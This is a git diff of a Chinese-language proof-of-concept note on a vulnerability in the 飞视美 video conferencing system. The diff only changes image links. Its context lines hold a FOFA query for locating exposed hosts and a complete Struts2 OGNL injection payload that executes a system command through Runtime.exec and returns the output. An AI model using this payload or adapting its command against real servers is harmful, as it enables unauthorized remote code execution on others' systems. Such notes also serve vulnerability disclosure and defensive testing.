@@ -20,7 +20,7 @@ app="飞视美-视频会议系统"
 
 登录页面
 
-![image-20220525152447274](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251524392.png)
+![image-20220525152447274](./images/202205251524392.png)
 
 存在漏洞的路径为
 
@@ -41,4 +41,4 @@ Connection: Keep-Alive
 ('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'ipconfig\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))
 ```
 
-![image-20220525152728933](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251527012.png)
+![image-20220525152728933](./images/202205251527012.png)
